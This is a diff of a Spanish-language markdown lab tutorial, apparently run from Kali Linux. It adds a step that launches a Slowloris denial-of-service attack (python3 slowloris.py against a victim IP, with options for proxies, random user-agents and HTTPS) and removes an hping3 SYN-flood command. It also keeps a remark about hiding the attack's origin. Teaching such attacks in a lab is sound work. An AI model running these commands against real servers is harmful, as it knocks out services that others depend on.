@@ -89,6 +89,7 @@ cd Slowloris
 ```
 </b>
 
+Se inicia el servicio de Apache, comprobando que está en activo ya el servicio en el sistema, lo cual podemos realizarlo mediante los siguientes comandos:
 <b>
 
 ```
@@ -97,11 +98,24 @@ service apache2 start
 ```
 service apache2 status
 ```
-
 </b>
 
+- <b>Paso 3</b>: Ahora podemos realizar un ataque muy sencillo de tipo DDoS con el comando:
+<b>
 
+```
+python3 slowloris.py [ip_victima] -s 500
+```
+</b>
 
+- Entre los diversos modificadores, se pueden elegir:
+  - <b>-p</b>: puerto del webserver, puerto 80 por defecto
+  - <b>-s</b>: número de sockets creados para usar en el test
+  - <b>-v</b>: aumenta la información en la salida (terminal de Kali Linux)
+  - <b>-ua</b>: randuseragents, utiliza user-agents aleatorios en cada petición
+  - <b>-x</b>: utiliza proxy de tipo SOCK5 para la conexión
+  - <b>-https</b>: utiliza el protocolo HTTPS para cada petición
+  - <b>-sleeptime</b>: tiempo de "descanso" entre envíos
 
 
 ------------------------------------------------------------------------------
@@ -109,13 +123,7 @@ service apache2 status
 
 
 
-- <b>Paso 2</b>: Podemos realizar un ataque muy sencillo de tipo DDoS con el comando:
-<b>
 
-```
-hping3 -p 80  -S --flood [ip_victima]
-```
-</b>
 Se puede comprobar que <b>-p</b> es utilizado para determinar el puerto, que <b>-S</b> activa la flag SYN del paquete TCP-IP, y que <b>--flood</b> indica que el envío de paquetes se realizará de la manera más rápida posible. Además, podemos encubrir el origen con múltiples variantes
 
 <b>
